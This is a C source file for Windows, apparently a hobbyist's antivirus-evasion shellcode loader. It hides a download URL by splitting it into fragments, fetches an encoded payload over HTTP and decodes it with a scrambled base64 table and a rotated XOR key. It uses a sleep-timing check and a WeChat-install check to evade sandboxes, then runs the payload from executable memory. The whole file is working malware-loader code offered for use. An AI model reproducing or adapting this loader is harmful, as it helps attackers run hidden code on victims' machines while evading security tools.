// 效果反而不如直接加载shellcode，不过写都写了
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

int fetch_url_content(const char* url, unsigned char** out_buffer) {
    HINTERNET hInternet = NULL;
    HINTERNET hUrl = NULL;
    DWORD totalSize = 0;
    DWORD bufferSize = 4096;
    unsigned char* buffer = NULL;
    DWORD bytesRead;
    int result = -1;
    hInternet = InternetOpen("MyUserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed\n");
        goto cleanup;
    }
    hUrl = InternetOpenUrl(hInternet, url, NULL, 0,
                           INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE |
                           INTERNET_FLAG_NO_CACHE_WRITE,
                           0);
    if (!hUrl) {
        printf("InternetOpenUrl failed\n");
        goto cleanup;
    }
    buffer = (unsigned char*)GlobalAlloc(GMEM_FIXED, bufferSize);
    if (!buffer) {
        printf("Memory allocation failed\n");
        goto cleanup;
    }
    while (1) {
        if (totalSize + 4096 > bufferSize) {
            bufferSize *= 2;
            unsigned char* newBuffer = (unsigned char*)GlobalReAlloc(buffer, bufferSize, GMEM_MOVEABLE);
            if (!newBuffer) {
                printf("Memory reallocation failed\n");
                goto cleanup;
            }
            buffer = newBuffer;
        }

        if (!InternetReadFile(hUrl, buffer + totalSize, 4096, &bytesRead)) {
            printf("InternetReadFile failed\n");
            goto cleanup;
        }

        if (bytesRead == 0) break;

        totalSize += bytesRead;
    }
    buffer[totalSize] = '\0';
    *out_buffer = buffer;
    result = totalSize;
cleanup:
    if (hUrl) InternetCloseHandle(hUrl);
    if (hInternet) InternetCloseHandle(hInternet);
    if (result <= 0 && buffer) GlobalFree(buffer);
    return result;
}

void adjust_first_to_last(char *array) {
    int length = strlen(array);
    if (length > 1) {
        char first_char = array[0];
        for (int i = 1; i < length; i++) {
            array[i - 1] = array[i];
        }
        array[length - 1] = first_char;
    }
}

int base64_decode(unsigned char *input, unsigned char **output, int len, char *base64_table, int base64_table_iv) {
    if (len % 4 != 0){
        len++;
    }
    for(long i = 0; i<base64_table_iv; i++){
        adjust_first_to_last(base64_table);
    }
    int output_len = len / 4 * 3;
    if (input[len - 1] == '=') output_len--;
    if (input[len - 2] == '=') output_len--;
    *output = (unsigned char *)malloc(output_len);
    if (*output == NULL) return 5;
    for (int i = 0, j = 0; i < len;) {
        int a = input[i] == '=' ? 0 : strchr(base64_table, input[i]) - base64_table;
        int b = input[i + 1] == '=' ? 0 : strchr(base64_table, input[i + 1]) - base64_table;
        int c = input[i + 2] == '=' ? 0 : strchr(base64_table, input[i + 2]) - base64_table;
        int d = input[i + 3] == '=' ? 0 : strchr(base64_table, input[i + 3]) - base64_table;
        (*output)[j++] = (a << 2) | (b >> 4);
        if (input[i + 2] != '=') (*output)[j++] = (b << 4) | (c >> 2);
        if (input[i + 3] != '=') (*output)[j++] = (c << 6) | d;
        i += 4;
    }
    return output_len;
}

void xor_encrypt_decrypt(unsigned char *input, unsigned char *output, char *key, int len) {
    int key_length = strlen(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ key[i % key_length];
    }
    output[len] = '\0';
}

int is_wechat_installed() {
    if (GetFileAttributes("C:\\Program Files (x86)\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributes("C:\\Program Files\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES) {
        return 1;
    }
    return 0;
}

int excess_code() {
    if (is_wechat_installed() == 0) {
        return 1;
    }
    return 0;
}

void del_characters(unsigned char * start, unsigned char * end, int interval_num, int len) {
    int flag = 0;
    for (int i = 1; i < len; ++i) {
        if ( i % interval_num == 0 ) {
            ++i;
        } 
        end[flag] = start[i];
        ++flag;
    }
}
char* concatenate_strings(char* arr[]) {
    if (arr == NULL) return NULL;
    size_t total_length = 0;
    int count = 0;
    while (arr[count] != NULL) {
        total_length += strlen(arr[count]);
        count++;
    }
    char* result = (char*)malloc(total_length + 1);
    if (result == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }
    result[0] = '\0';
    count = 0;
    while (arr[count] != NULL) {
        strcat(result, arr[count]);
        count++;
    }
    return result;
}

int main() {
    excess_code();
    unsigned char *decoded = NULL;
    void *exec_mem = NULL;
    unsigned char decrypted[2048];
    char* shellcode_url_list[] = {"h", "tt", "p:", "//", "127.", "0.0", ".1:7", "777/p", "aylo", "ad.txt", NULL};
    char* shellcode_url = concatenate_strings(shellcode_url_list);
    char base64_table[] = "i78NfAguvwxY0kZ345lMh9jCXabcJKLV2WI16+/QROPrstTUByzmnopDEFGHdeSq";
    char key[] = "Sqr+/QR*79!Ag9zwxYZOPra)tTUBykf(0deEFGH45Wmnopuv3AeMhi7I16B&jCXabcJ0lsDKLV238N";
    long base64_table_iv = 3333333;
    long key_iv = 99999999;
    unsigned char* response_shellcode = NULL;
    clock_t start, end;
    int cpu_time_used;
    start = clock();
    Sleep(2000);
    end = clock();
    cpu_time_used = ((double) (end - start)) / CLOCKS_PER_SEC;
    int shellcode_response_len = fetch_url_content(shellcode_url, &response_shellcode);
    int interval_num = response_shellcode[0] - 48;
    unsigned char shellcode[2048];
    del_characters(response_shellcode, shellcode, interval_num, strlen(response_shellcode));
    base64_table_iv = base64_table_iv + 2 - cpu_time_used;
    key_iv = key_iv + 2 - cpu_time_used;
    int shellcode_len = 0;
    for (int i = 0; i< 2048; i++) {
        if (shellcode[i] != 0) {
            ++shellcode_len;
        }
        else {
            break;
        }
    }
    int decoded_len = base64_decode(shellcode, &decoded, shellcode_len, base64_table, base64_table_iv);
    for(int i = shellcode_len/4*3-1; i>=0 ; i--){
        if (decoded_len <= 5) { goto exit; }
        if (decoded[i] != '\x00') {
            for(long i = 0; i<key_iv; i++){
                adjust_first_to_last(key);
            }
            exec_mem = VirtualAlloc(0, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            xor_encrypt_decrypt(decoded, decrypted, key, decoded_len);
            memcpy(exec_mem, decrypted, sizeof(decrypted));
            break;
        }
    }
    ((void(WINAPI*)(void))exec_mem)();
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    exit: return 0;
}
